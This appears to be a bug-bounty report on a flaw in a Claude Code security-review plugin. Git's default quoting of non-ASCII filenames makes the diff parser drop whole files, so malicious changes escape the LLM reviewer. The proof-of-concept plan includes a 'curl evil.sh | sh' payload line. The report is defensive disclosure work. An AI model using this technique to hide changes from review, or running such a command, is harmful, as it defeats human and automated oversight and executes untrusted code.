### Title
Missing `core.quotePath=false` in `get_git_diff` lets unicode/special-char filenames evade diff header parsing, hiding malicious source changes from review - (File: plugins/security-guidance/hooks/gitutil.py)

### Summary
`get_git_diff` runs `git diff` using the shared `GIT_CMD` constant, which does not set `-c core.quotePath=false`, unlike `_git_name_only` and `_git_status_porcelain`/`_list_untracked` in the same module which explicitly disable quoting. Because git's default `core.quotePath=true` wraps and octal-escapes any path containing non-ASCII bytes (and other special characters) in double quotes, `extract_file_paths_from_diff` and `parse_diff_into_files`'s regex `^a/(.+?) b/(.+)$` (which assumes an unquoted `a/<path> b/<path>` header) fails to match such lines entirely, silently dropping that file's whole diff block from the review pipeline.

### Finding Description
`get_git_diff` builds its subprocess command as `cmd = [*GIT_CMD, "diff", "--no-color", "--no-ext-diff", baseline_sha] + ... + pathspec` [1](#0-0)  where `GIT_CMD` only disables `core.fsmonitor` and `core.hooksPath`, but never `core.quotePath` [2](#0-1) . By contrast, `_git_name_only` and `_list_untracked`/`_git_status_porcelain` explicitly pass `-c core.quotePath=false` because the code comments call out that this "keeps non-ASCII and space-containing paths intact" [3](#0-2) , confirming the maintainers know quoting is a hazard for this exact regex-based downstream parsing but did not apply the same fix to `get_git_diff`.

With git's default `core.quotePath=true`, any path containing non-ASCII characters (or other special bytes) is rendered wrapped in double quotes with C-style octal escaping, e.g. `diff --git "a/\344\270\255\346\226\207.py" "b/\344\270\255\346\226\207.py"` instead of the plain `diff --git a/中文.py b/中文.py`. The downstream consumers of `get_git_diff`'s raw output, `extract_file_paths_from_diff` and `parse_diff_into_files`, both split on `"diff --git "` and match the first line against `re.match(r'^a/(.+?) b/(.+)$', lines[0])` [4](#0-3) [5](#0-4) . Because the quoted line starts with `"a/...` rather than the literal `a/`, the regex does not match at all, so `header_match` is falsy and the entire per-file diff block (including all `+`/`-` hunk lines) is skipped via `continue` — never reaching `_is_reviewable_source` classification and never appearing in `parse_diff_into_files`'s output list that feeds the LLM security reviewer.

This is a direct, silent, whole-file omission from the review set — not a misclassification that could at least be inspected. An attacker who can get Claude Code (or a compromised/malicious repo workflow) to write or modify a source file with a non-ASCII/unicode filename (a plausible name in real-world repos, e.g. localized documentation directories, i18n test fixtures, or intentionally crafted "invisible" filenames using homoglyphs) causes that file's dangerous diff content to never be surfaced for review by `Stop-hook and commit-review diff collection`, even though `get_git_diff` itself returns the full diff text including that content.

### Impact Explanation
This breaks the stated invariant that "reviewable-source filtering must not let attacker-crafted filenames hide dangerous source changes." Since the security-guidance plugin's Stop-hook/commit-review flow is Claude Code's automated gate that inspects diffs for dangerous commands/code before they are committed or pushed, a file whose diff is silently dropped from `parse_diff_into_files`'s output effectively bypasses the LLM security review entirely. This matches the described Immunefi impact class of "Unauthorized local command execution that bypasses Claude Code approval or deny controls" — a malicious script placed in a unicode-named file (e.g. a shell/Python file with a non-ASCII name) can be committed/pushed with its content never inspected by the reviewer.

### Likelihood Explanation
- No special privilege is required beyond normal repository content control — a filename is the only "input," and unicode filenames are common and unremarkable in real repos (i18n content, localized docs, homoglyph-based social engineering).
- The bug is fully deterministic given git's own default (`core.quotePath=true` unless overridden), and this codebase demonstrates awareness of the exact same failure mode elsewhere (`_git_name_only`, `_list_untracked`) but omitted the fix in `get_git_diff`.
- Reproducible in a plain unit test with no timing or race dependencies.

### Recommendation
Add `-c core.quotePath=false` to the `git diff` invocation in `get_git_diff` (either add it to the shared `GIT_CMD` constant, or append it the same way `_git_name_only` does), and/or make `extract_file_paths_from_diff`/`parse_diff_into_files`'s header regex tolerant of both quoted (`"a/...` `"b/...`) and unquoted forms so a parsing failure never silently drops a file — at minimum, log/flag any `file_diff` block whose header fails to match so a hidden file is detectable rather than silently vanishing.

### Proof of Concept
Unit test plan for `plugins/security-guidance/hooks/gitutil.py`:
1. In a temp git repo, commit an initial file, then add a new file with a non-ASCII filename containing malicious source, e.g. `"密.py"` with content `import os; os.system("curl evil.sh | sh")`.
2. Call `get_git_diff(cwd, baseline_sha)` (baseline = the initial commit) with `core.quotePath` left at its git default (do not pass `-c core.quotePath=false`) — confirm the raw diff text returned contains the quoted/escaped header (e.g. contains a literal `"` right after `diff --git `) and still contains the `os.system` payload text in the raw diff.
3. Feed that raw diff into `parse_diff_into_files(diff_output)` and `extract_file_paths_from_diff(diff_output)`.
4. Assert (bug reproduction): the returned list is empty / does not contain the malicious file, i.e. `all("密" not in fp for fp, _ in parsed)` and `"os.system" not in "".join(content for _, content in parsed)` — demonstrating the dangerous change is invisible to the review pipeline despite being present in `get_git_diff`'s output.
5. Regression assertion after fix: with `-c core.quotePath=false` applied to the `git diff` call, repeat steps 1–3 and assert the file IS present in `parsed` and its content includes `os.system`.
